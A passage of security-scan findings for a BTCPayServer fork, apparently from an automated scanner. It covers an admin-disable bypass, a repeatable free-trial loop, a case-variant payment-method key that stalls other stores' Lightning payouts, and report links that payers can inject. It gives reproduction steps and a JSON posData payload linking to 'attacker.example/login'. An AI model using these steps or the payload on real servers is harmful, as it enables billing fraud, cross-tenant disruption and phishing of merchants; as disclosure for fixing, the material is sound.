   The service's own SQL recomputation (used on PlanUpdated and migration) locks a user unless `ss.active AND @canAccess`; the PlanStarted path omits the `active` condition, which is the inconsistency that lets a suspended (inactive) subscriber be unlocked.
4. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:533–575](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L533-L575)
   TryStartPlan: CanStartNextPlanEx requires IsSuspended == false, so a suspended subscriber fails it, but the `else if (checkout.OnPay == HardMigration)` branch (551-573) has no suspension check: once TryCreditDebitSubscriber succeeds (the invoice payment plus the unused-period refund covers the new price), StartNextPlan runs and PlanStarted(sub, prevPlan) is emitted (575) while the subscriber is still suspended.
5. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:303–312](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L303-L312)
   Scheduled (AtPeriodEnd) plan changes are applied in UpdateSubscriptionStates with no suspension check and emit the same PlanStarted event with no payment; a suspended subscriber who scheduled a change from the portal gets the same unlock at period end.
6. [BTCPayServer/Controllers/UIAccountController.cs:483–495](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L483-L495)
   A disabled user whose password is correct reaches RedirectLoginSuccess (IsDisabledTemporarily is false for a permanent disable, line 199); CanLogin fails, so the user is signed in under the LimitedLogin scheme and redirected to loginContext.FailedRedirectUrl.
7. [BTCPayServer/Plugins/Monetization/MonetizationLoginExtension.cs:28–34](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationLoginExtension.cs#L28-L34)
   Because the admin disable suspended the subscription (MonetizationHostedService 146-156), the extension sees IsActive false / IsSuspended true and sets FailedRedirectUrl to ~/account/billing?fastRedirect=true (RedirectToManageBilling, 60-64).
8. [BTCPayServer/Plugins/Monetization/Controllers/UIUserMonetizationController.cs:56–110](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/Controllers/UIUserMonetizationController.cs#L56-L110)
   ManageBilling is the only action accepting the LimitedLogin scheme. For the disabled user it finds their subscriber and mints a PortalSessionData (or, with fastRedirect and a single plan change from a no-access plan, a HardMigration checkout directly), redirecting them into the anonymous subscriber portal; no account-state check.
9. [BTCPayServer/Plugins/Subscriptions/Controllers/UISubscriberPortalController.cs:209–229](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/UISubscriberPortalController.cs#L209-L229)
   The portal's 'migrate' command creates a HardMigration PlanCheckoutData to any configured PlanChange target and sends the user to pay the invoice; no suspension or account-state check (CreatePlanMigrationCheckout validates only that the PlanChange record exists).
10. [BTCPayServer/Plugins/Subscriptions/Views/UISubscriberPortal/SubscriberPortal.cshtml:493](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Views/UISubscriberPortal/SubscriberPortal.cshtml#L493)
   The plan-change cards and Upgrade/Downgrade buttons are rendered whenever the plan has PlanChanges, independently of Subscriber.IsSuspended, so the suspended user is offered the migration in the UI.
11. [BTCPayServer/Services/UserService.cs:212–239](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L212-L239)
   SetDisabled(false) clears LockoutEnd (the sole representation of 'disabled by admin'), publishes DisabledChanged(false) and recomputes the stores' NoActiveUser flag for the user.
12. [BTCPayServer.Data/ApplicationDbContextExtensions.Users.cs:40–67](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/ApplicationDbContextExtensions.Users.cs#L40-L67)
   NoActiveUser becomes false again as soon as one member of the store has LockoutEnd NULL; UIInvoiceController.CreateInvoiceCoreRaw (lines 209-213) refuses invoice creation while NoActiveUser is true, so re-enabling the user re-opens invoice creation on all their stores (PoS, payment requests, pay buttons, LNURL).
13. [BTCPayServer/Controllers/UIServerController.Users.cs:388–399](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Users.cs#L388-L399)
   The administrator's disable action is ToggleUserPost -> SetDisabled(userId, true) with a null source; nothing records that the disable was administrative, so Monetization cannot distinguish it from its own expiry lockouts and overwrites it.

## Impact
An administrative security decision (account disabled) is reversed by its subject: LockoutEnd is cleared, the admin UI misreports the account as enabled, and the NoActiveUser protection on the user's stores is lifted so those stores resume creating invoices and receiving payments; the durable disable is downgraded to a subscription suspension that disappears on demonetization. Login, API keys and Basic auth stay blocked by MonetizationLoginExtension while the suspension holds, so no confidentiality impact; integrity of server security state is affected (LOW); no availability impact.

## Reproduction steps
1. Attacker: a registered, admin-disabled user who still knows their password (PR:LOW). Over the network they POST /login (signed in under LimitedLogin), follow the automatic redirect to ~/account/billing, choose 'migrate' in the portal and pay the resulting invoice to the monetization store (free when the target plan's price is covered by credit plus the unused-period refund, or when an AtPeriodEnd change is scheduled). The hosted services then clear the disabled state without any admin involvement. Requires monetization to be active with a plan-change path to a can-access plan configured in the offering (AT:PRESENT). No user interaction.

## Recommended fix
1. Monetization expresses subscription state through the same LockoutEnd field that encodes an administrative disable, and UpdateUserLockout/SetDisabled(false) on PlanStarted does not check whether the subscription is active (not suspended) or whether the disable originated from an administrator - unlike the service's own SQL rule (`active AND canAccess`). Fix criteria: A disable performed by an administrator must persist until an administrator reverses it: Monetization must never clear it (e.g. by recording the disable source, or by only re-enabling when the subscription is active and not suspended, consistent with the SQL recomputation). Verify: disable a subscriber, have them pay a plan migration through the portal, and confirm IsDisabled stays true and their stores keep NoActiveUser = true.
2. TryStartPlan's HardMigration branch and the scheduled-change path in UpdateSubscriptionStates start a new plan for a suspended subscriber, emitting PlanStarted while suspension is still in force; the portal offers and accepts 'migrate' for suspended subscribers. Fix criteria: Plan starts for suspended subscribers should not be processed as activations (refuse or defer the migration while suspended, or emit no activation-like event), and the portal should not create migration checkouts for suspended subscribers. Verify a suspended subscriber paying a HardMigration checkout, or reaching a scheduled change, produces no PlanStarted/SetDisabled(false).

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257716

---

# ManageBilling fastRedirect grants a fresh free trial to existing subscribers on every upgrade

## Details
UIUserMonetizationController.ManageBilling with fastRedirect=true (70-96) is the path a subscriber is sent down on login whenever their current plan lacks the can-access feature and has a configured PlanChange (MonetizationLoginExtension.cs 37-44 sets FailedRedirectUrl to ~/account/billing?fastRedirect=true). The Monetization lockout for such users is infinite (UpdateUserLockoutStatus writes LockoutEnd='infinity'; UserService.SetDisabled writes DateTimeOffset.MaxValue), so ApplicationUser.IsDisabledTemporarily is false and POST /login proceeds past the LockoutView check into RedirectLoginSuccess -> CanLogin -> the extension, issues a LimitedLogin cookie and follows the redirect (UIAccountController.cs 487-497). ManageBilling accepts the LimitedLogin scheme (57).

When the no-access plan has exactly one PlanChange, ManageBilling creates a HardMigration checkout to the upgrade plan with `IsTrial = upgradePlan.TrialDays > 0` (88). The comment (70-71) says the migration 'reimburses the user for the unused part of his current plan', i.e. a paid migration is intended, and the project's own test of this flow (BTCPayServer.Tests/MonetizationTests.cs ~262-285) pays an invoice because its 'Pro Plan' is created with TrialDays = 0. Nothing checks whether the subscriber already consumed a trial, paid for a period, or has been on the upgrade plan before; SubscriberData has no trial-consumed state and IsTrial is carried only on the checkout row.

The checkout page shows 'Proceed to free trial' (PlanCheckout.cshtml 238-242); the POST calls ProceedToSubscribe -> IsTrial -> StartPlanCheckoutWithoutInvoice -> TryStartPlan (SubscriptionHostedService.cs 533-576). Both branches honour IsTrial for an existing subscriber: on the normal branch (Phase not Normal, e.g. Expired) `checkout.IsTrial ||` skips TryChargeSubscriber; on the HardMigration branch (Phase Normal) `checkout.IsTrial ||` skips TryCreditDebitSubscriber, so neither a charge nor the promised reimbursement credit is posted while RefundAmount is still recorded. SubscriberData.StartNextPlan(now, trial: true) (188-207) then sets TrialEnd = now + TrialDays and PaidAmount = null regardless of history, and PlanStarted re-enables the account (MonetizationHostedService.cs 84-89).

Elsewhere IsTrial is only set on NewSubscriber checkouts or at the operator's explicit choice (UIUserMonetizationController.NewUser 43-50; UIOfferingController.NewSubscriber 67 `&& isTrial`; GreenfieldOfferingController 487 `&& model.IsTrial is true` under CanManageSubscribers); the Subscriptions plugin's own existing-subscriber migration, CreatePlanMigrationCheckout (712-758), never sets IsTrial.

Consequence: an existing subscriber on the no-access plan receives the upgrade plan's full trial (server access) for free instead of paying the intended migration. Where the offering also has a PlanChange back to the no-access plan A (B->A Downgrade), the loop is unbounded: on B in Trial phase the subscriber opens the portal via ~/account/billing and POSTs command=migrate&changedPlanId=A (UISubscriberPortalController.cs 209-230; an AtPeriodEnd timing is still immediate because Phase != Normal). CreateInvoiceForCheckout computes amount = A.Price - credit - unused(B), and unused(B) is null during trial (PaidAmount null), so the cost of the downgrade is A.Price (0 for a free parked tier, in which case TryChargeSubscriber with charge 0 succeeds and the plan starts without an invoice). The subscriber is now on A (Normal phase, locked out); the next login takes the fastRedirect path and starts a fresh trial of B. Each iteration yields B.TrialDays of can-access for A.Price instead of B.Price.

Conditions: Monetization active and the operator's offering contains a plan without can-access that has exactly one plan change to a plan with TrialDays > 0 (the AddPlan form's TrialDays placeholder is 7 and the activation modal's starter trial defaults to 7; MigrateUsersModal.cshtml documents no-can-access plans as a supported configuration). Unbounded repetition additionally requires a plan change back to the no-access plan.

## Evidence
1. [BTCPayServer/Plugins/Monetization/Controllers/UIUserMonetizationController.cs:70–95](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/Controllers/UIUserMonetizationController.cs#L70-L95)
   fastRedirect block: when the caller's current plan lacks can-access and has exactly one PlanChange, creates a PlanCheckoutData for the EXISTING subscriber with IsTrial = upgradePlan.TrialDays > 0 and OnPay = HardMigration (85-90). Nothing consults the subscriber's trial or payment history; the comment at 70-71 states a reimbursing (paid) migration was intended. ManageBilling (57) accepts the LimitedLogin scheme so a locked-out subscriber reaches it.
2. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:533–575](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L533-L575)
   TryStartPlan honours checkout.IsTrial for existing subscribers on both branches: normal branch (540-549) `checkout.IsTrial ||` skips TryChargeSubscriber; HardMigration branch (551-573) `checkout.IsTrial ||` skips TryCreditDebitSubscriber, so the plan starts for free and the unused-period credit the comment promises is never posted although RefundAmount is set (567). Reached from ProceedToSubscribe (97-99) -> StartPlanCheckoutWithoutInvoice (430-446) whenever checkout.IsTrial.
3. [BTCPayServer.Data/Data/Subscriptions/SubscriberData.cs:188–206](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Data/Subscriptions/SubscriberData.cs#L188-L206)
   StartNextPlan(now, trial: true) resets TrialEnd = now + plan.TrialDays and PaidAmount = null regardless of the subscriber's history; SubscriberData carries no trial-consumed flag, so each pass grants a full trial period.
4. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:712–757](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L712-L757)
   The Subscriptions plugin's own migration path for existing subscribers, CreatePlanMigrationCheckout, never sets IsTrial. Every other IsTrial producer is either a NewSubscriber checkout or an explicit operator choice (UIUserMonetizationController.cs:48 NewUser; UIOfferingController.cs:67 `plan.TrialDays > 0 && isTrial`; GreenfieldOfferingController.cs:487 `&& model.IsTrial is true` behind CanManageSubscribers). The fastRedirect block is the only place an existing subscriber is given a trial without the operator choosing it.
5. [BTCPayServer/Plugins/Monetization/MonetizationLoginExtension.cs:37–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationLoginExtension.cs#L37-L43)
   Any login by a subscriber whose plan lacks can-access and has a PlanChange gets FailedRedirectUrl = ~/account/billing?fastRedirect=true (RedirectToManageBilling 60-64), so the trial-granting path is reached simply by logging in.
6. [BTCPayServer/Controllers/UIAccountController.cs:487–496](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L487-L496)
   RedirectLoginSuccess: when CanLogin fails it signs the user in under the LimitedLogin scheme and redirects to loginContext.FailedRedirectUrl. The Monetization-locked user reaches this point because both lockout writers use an infinite LockoutEnd (MonetizationHostedService.cs:380 'infinity'; UserService.cs:222 DateTimeOffset.MaxValue), so ApplicationUser.IsDisabledTemporarily (ApplicationUser.cs:43-44) is false and the LockoutView short-circuit at line 200 is not taken.
7. [BTCPayServer/Plugins/Subscriptions/Controllers/UISubscriberPortalController.cs:209–229](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/UISubscriberPortalController.cs#L209-L229)
   From the portal (a session the subscriber mints via ~/account/billing without fastRedirect) the subscriber POSTs command=migrate with changedPlanId of the no-access plan whenever a PlanChange in that direction exists; CreatePlanMigrationCheckout makes it an immediate HardMigration (AtPeriodEnd timing only defers when Phase is Normal, not during trial). After it completes the next login grants another trial of the upgrade plan, closing the loop.

## Impact
The operator's billing logic is subverted: paid server access (can-access) is obtained for free for the upgrade plan's trial duration, repeatably where a downgrade path exists, and the reimbursement credit the HardMigration promises is recorded (RefundAmount) but never posted, leaving subscription state inconsistent. Impact is on the integrity of the subscription/billing state and the operator's revenue; no confidentiality or availability effect, and no funds leave the system.

## Reproduction steps
1. Attacker: an authenticated non-admin subscriber (PR:LOW) whose plan lacks can-access, i.e. a locked-out tenant of the monetized server. They POST /login; because the Monetization lockout is infinite the request reaches RedirectLoginSuccess, which issues a LimitedLogin cookie and redirects to ~/account/billing?fastRedirect=true; ManageBilling mints a trial checkout for the upgrade plan and the subscriber clicks 'Proceed to free trial'; TryStartPlan starts the plan with no charge and the account is re-enabled. With a downgrade PlanChange back to the no-access plan they repeat via the portal's migrate command. Requires the operator's offering to contain a no-can-access plan with exactly one PlanChange to a plan with TrialDays > 0 (AT:PRESENT); no user interaction by a victim.

## Recommended fix
1. ManageBilling's fast-redirect checkout sets IsTrial for an existing subscriber from the target plan's TrialDays alone, with no record on the subscriber of a trial already consumed or a period already paid. Fix criteria: Trials are granted only to genuinely new subscribers, or at most once per subscriber/plan tracked persistently on the subscriber; the Monetization fast-redirect migration for an existing subscriber behaves like CreatePlanMigrationCheckout (a paid HardMigration with reimbursement). Verify: a subscriber whose trial has ended cannot obtain a future TrialEnd via ~/account/billing?fastRedirect=true, and a downgrade-then-login cycle does not yield a second trial.
2. SubscriptionHostedService.TryStartPlan applies checkout.IsTrial on the HardMigration branch, short-circuiting TryCreditDebitSubscriber while still recording RefundAmount, so an existing subscriber's plan starts unpaid and the promised credit is never posted. Fix criteria: TryStartPlan does not honour IsTrial for a checkout whose subscriber already exists unless the subscriber is eligible under the persistent trial rule above, and RefundAmount is recorded only when the corresponding credit was actually posted. Verify: a HardMigration from a paid no-access plan charges the new price minus the unused credit and the credit history shows the reimbursement.

---
**Severity:** LOW
**Status:** Open
**Category:** Business logic error
**CWE:** [CWE-841](https://cwe.mitre.org/data/definitions/841.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257715

---

# Case-variant PaymentMethodId creates duplicate store config key, stalling other stores' Lightning payouts

## Details
PaymentMethodId is a value object whose Equals/GetHashCode are case-insensitive (PaymentMethodId.cs:64-87) but whose string form is used as a case-sensitive key in persisted JSON. PaymentMethodId.TryParse canonicalises only legacy aliases: the current type names 'CHAIN', 'LN', 'LNURL' are not in GetPaymentType, so 'btc-chain' falls through to `new PaymentMethodId($"{cryptoCode.ToUpperInvariant()}-{paymentType}")` (line 149) and yields 'BTC-chain', equal to but string-distinct from the canonical 'BTC-CHAIN'. PaymentMethodIdModelBinder hands that id to controllers unchanged.

GreenfieldStorePaymentMethodsController.UpdateStorePaymentMethod (PUT /api/v1/stores/{storeId}/payment-methods/{paymentMethodId}) is the one writer that persists a caller-supplied id string: AssertHasHandler succeeds because HandlersDictionary is keyed by PaymentMethodId, the on-chain handler accepts any xpub, and `Store.SetPaymentMethodConfig(paymentMethodId, config)` does `strategies[paymentMethodId.ToString()] = config` on a JObject (StoreDataExtensions.cs:109), adding a 'BTC-chain' property beside 'BTC-CHAIN'. The store is saved (line 113) before the trailing read throws.

StoreDataExtensions.GetPaymentMethodConfigs (line 138) then throws ArgumentException on `Dictionary<PaymentMethodId,JToken>.Add` for that store, permanently (only a DELETE with the exact odd casing or a DB edit removes the stray key). Inside the attacker's own store this breaks invoice creation and the dashboard/settings pages, but a holder of btcpay.store.canmodifystoresettings is an owner by the project's own definition (StoreRepository.cs:398,457) and may already hard-delete the store (UIStoresController.Settings.cs:207-211), so that part is self-harm with no gain.

The security impact crosses the store boundary: LightningPendingPayoutListener (a singleton IHostedService) settles InProgress Lightning payouts for all stores in one Act() loop and calls `store.GetPaymentMethodConfigs(_handlers)` per store with no per-store exception isolation (LightningPendingPayoutListener.cs:71-78). The payout query has no ORDER BY; once the attacker's store group is reached the exception aborts the iteration, BaseAsyncService.CreateLoopTask logs, sleeps a minute and re-runs, and the same throw recurs. Every other tenant whose payout group follows the attacker's never has its in-flight Lightning payouts resolved to Completed or Cancelled. InProgress payouts cannot be cancelled by the merchant (PullPaymentHostedService.cs:835) and count as completed against the pull payment (lines 907-910), so failed payments leave payees unpaid and funds reserved indefinitely. The attacker's own InProgress payout is also never processed, which keeps the fault permanent.

The same shared-helper mismatch affects `storeBlob.SetExcluded(paymentMethodId, !enabled)` (StoreBlob.cs:265-275, case-sensitive HashSet<string>), producing an exclusion the UI toggle cannot remove; it is the same root cause but adds no cross-store reach.

## Evidence
1. [BTCPayServer/Payments/PaymentMethodId.cs:139–157](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PaymentMethodId.cs#L139-L157)
   TryParse canonicalises only legacy aliases. 'CHAIN', 'LN', 'LNURL' are not in GetPaymentType, so 'btc-chain' takes the fallback at line 149 and becomes the id 'BTC-chain' (crypto code upper-cased, type casing preserved) while the canonical id built by PaymentTypes.CHAIN.GetPaymentMethodId is 'BTC-CHAIN'. The root fix is to make every branch yield one canonical string per logical id.
2. [BTCPayServer/Payments/PaymentMethodId.cs:64–87](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PaymentMethodId.cs#L64-L87)
   Equals and GetHashCode are OrdinalIgnoreCase, so 'BTC-chain' and 'BTC-CHAIN' are equal dictionary keys even though ToString() differs. This is the mismatch that turns a case variant into a duplicate.
3. [BTCPayServer/Data/StoreDataExtensions.cs:103–141](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/StoreDataExtensions.cs#L103-L141)
   SetPaymentMethodConfig writes strategies[paymentMethodId.ToString()] into a JObject (ordinal property names, line 109), so 'BTC-chain' is persisted beside an existing 'BTC-CHAIN'. GetPaymentMethodConfigs parses every property and calls Dictionary<PaymentMethodId,JToken>.Add (line 138); the two parsed keys are equal under the case-insensitive comparer, so Add throws ArgumentException for every caller.
4. [BTCPayServer/Controllers/GreenField/GreenfieldStorePaymentMethodsController.cs:67–115](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStorePaymentMethodsController.cs#L67-L115)
   PUT /api/v1/stores/{storeId}/payment-methods/{paymentMethodId} (CanModifyStoreSettings). AssertHasHandler (lines 117-122) passes for 'BTC-chain' because HandlersDictionary is a Dictionary<PaymentMethodId,..> with the default (case-insensitive) comparer; BitcoinLikePaymentHandler.ValidatePaymentMethodConfig accepts a bare xpub string; line 103 persists the config under the caller's casing and line 113 saves the store before the trailing GET throws. The only writer that stores a caller-supplied id string; every other SetPaymentMethodConfig/SetExcluded caller uses the handler's canonical id.
5. [BTCPayServer/ModelBinders/PaymentMethodIdModelBinder.cs:25–27](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/ModelBinders/PaymentMethodIdModelBinder.cs#L25-L27)
   The binder passes the raw route segment through TryParse without canonicalising, so the case-variant id reaches the controller unchanged.
6. [BTCPayServer/Payments/Lightning/LightningPendingPayoutListener.cs:61–83](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningPendingPayoutListener.cs#L61-L83)
   Server-wide hosted service (registered at Hosting/BTCPayServerServices.cs:413). Act() loads every InProgress Lightning payout of every store (no ORDER BY in PullPaymentHostedService.GetPayouts), groups by store, and at line 78 calls store.GetPaymentMethodConfigs(_handlers) outside any try/catch. At the attacker's store this throws, aborting the whole iteration: every store whose group follows it in the result set never has its pending payouts finalised. The attacker's own payout is likewise never processed, so the condition is permanent.
7. [BTCPayServer/HostedServices/BaseAsyncService.cs:48–70](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/BaseAsyncService.cs#L48-L70)
   CreateLoopTask catches the exception, logs a warning, sleeps one minute and re-runs Act(), which throws again at the same store; the listener is thus effectively disabled for the tenants enumerated after the attacker's store rather than skipping just that store.
8. [BTCPayServer/PayoutProcessors/Lightning/LightningAutomatedPayoutProcessor.cs:308–314](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PayoutProcessors/Lightning/LightningAutomatedPayoutProcessor.cs#L308-L314)
   How the attacker seeds an InProgress Lightning payout in their own store: when Pay() and GetPayment() against the store's Lightning endpoint both fail or report pending, success stays null and the payout is saved InProgress with a proof blob, to be settled later by LightningPendingPayoutListener. HandlePayout is reached from the automated processor (CanModifyStoreSettings configures it) or from UILightningLikePayoutController.ProcessLightningPayout (lines 119-172, CanUseLightningNodeInStore).
9. [BTCPayServer/Extensions.cs:401–428](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Extensions.cs#L401-L428)
   IsSafeLightningConnectionString lets a non-admin store configure an external http/https Lightning endpoint on any public host, so the attacker can point payouts at a node or fake REST endpoint they control.
10. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:833–843](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L833-L843)
   Victim impact: InProgress payouts cannot be cancelled by the merchant (line 835 returns InvalidState), and CalculatePullPaymentProgress (lines 907-910) counts InProgress payouts as completed, so a stalled payout whose Lightning payment actually failed leaves the payee unpaid and the pull-payment amount reserved with no UI recourse.

## Impact
Cross-tenant: other stores' in-flight Lightning payouts enumerated after the attacker's store are never settled; InProgress payouts cannot be cancelled by the merchant and count as completed against the pull payment, so failed payments leave payees unpaid and funds reserved — a limited integrity and availability loss of the shared payout-finalisation service, persisting until an admin repairs the attacker's store data. No confidentiality impact. The attacker's own store also stops creating invoices, but that store is theirs to destroy. Assumption: BTCPayServer.Lightning.All 1.7.13 Validate() does not require a live connection; even if it did, a real attacker-run node suffices.

## Reproduction steps
1. Attacker: any registered user who owns a store (registration is open by default; hostile tenant). In their store they (1) configure a Lightning payment method pointing at a public host they control, permitted by IsSafeLightningConnectionString; (2) create and approve a payout with a BOLT11 destination and trigger payment via the Lightning payout UI or automated processor — Pay/GetPayment fail or report pending, so the payout is saved InProgress; (3) PUT /api/v1/stores/{id}/payment-methods/btc-chain with any xpub, persisting 'BTC-chain' beside 'BTC-CHAIN'. LightningPendingPayoutListener then throws at this store on every run. Which victims are affected depends on the unordered query's row order, outside the attacker's control.

## Recommended fix
1. PaymentMethodId.TryParse returns ids whose string form is not canonical (payment type casing preserved, unknown strings kept verbatim) while equality is case-insensitive, so the same logical id can have several ToString() forms. Fix criteria: Parsing must yield a single canonical string form for equal ids (e.g. upper-case the whole id, or at least the payment type, for every branch of TryParse), so that ToString() of any two equal PaymentMethodIds is identical. Verify: TryParse("btc-chain").ToString() == PaymentTypes.CHAIN.GetPaymentMethodId("BTC").ToString(), and the same for 'ln'/'lnurl' and arbitrary custom ids differing only by case.
2. Persisted payment-method keys (StoreData.DerivationStrategies JObject, StoreBlob.ExcludedPaymentMethods string set) are written and looked up by raw ToString() with case-sensitive string comparison, while readers assume at most one property per logical PaymentMethodId. Fix criteria: SetPaymentMethodConfig/SetExcluded must replace or remove the existing entry that is equal under PaymentMethodId equality rather than adding a sibling that differs only by case, and GetPaymentMethodConfigs must tolerate (or migrate) legacy duplicates instead of throwing. Verify: after PUT payment-methods/btc-chain on a store with BTC-CHAIN configured, the store has exactly one on-chain config, invoice creation and the dashboard still work, and toggling enabled via API and UI agree.
3. LightningPendingPayoutListener.Act() processes every store's pending payouts in one loop without isolating per-store failures, so one tenant's corrupt configuration halts settlement for other tenants. Fix criteria: A failure reading or processing one store's configuration must be caught, logged and skipped so that the remaining stores in the same iteration are still processed. Verify: with one store whose GetPaymentMethodConfigs throws, pending Lightning payouts of every other store still transition to Completed/Cancelled on the next run.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper Case Sensitivity Handling
**CWE:** [CWE-178](https://cwe.mitre.org/data/definitions/178.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257711

---

# Invoices report renders payer-authored posData *url values as clickable links for merchants

## Details
The Reports page's Vue table treats every column whose name ends in 'url' (case-insensitive) as a hyperlink column: a value beginning with 'http' is rendered as `<a :href="value" target="_blank">Link</a>` (StoreReports.cshtml 145-151) under a header built from the column name by titleCase(field.name). The Invoices report (InvoicesReportProvider.FlattenFields) derives its extra columns by flattening the whole invoice metadata JObject, so nested posData keys and any top-level metadata key become column names (fieldName = prop.Name) with their values copied verbatim as 'text' fields. The convention exists for the server-set orderUrl, but nothing restricts it to server-authored keys.

Routes: (a) on a store with 'Allow anyone to create invoice' enabled, the anonymous legacy Bitpay endpoint POST /invoices stores the caller's posData string verbatim (BitpayInvoiceController.cs:140, PosDataLegacy parses it into the posData JObject), e.g. `{"posData":"{\"refundApprovalUrl\":\"https://attacker.example/login\"}","price":0.00000001,"currency":"BTC"}`; (b) any Greenfield API key holding only CanCreateInvoice can put the same key at any depth of `metadata` (UIInvoiceController.cs:170-171 stores it via InvoiceMetadata.FromJObject). Once the invoice has any payment, or a non-trivial status such as Expired+PaidPartial (InvoicesReportProvider.cs 140-157), the Invoices report gains a column titled by the attacker (e.g. 'Refund Approval Url') whose cell is a 'Link' anchor to the attacker's site. Store members holding CanViewReports (Owner/Manager/Employee/Guest, BTCPayServerServices.cs:598-600) click it inside their own backend and land on an attacker page.

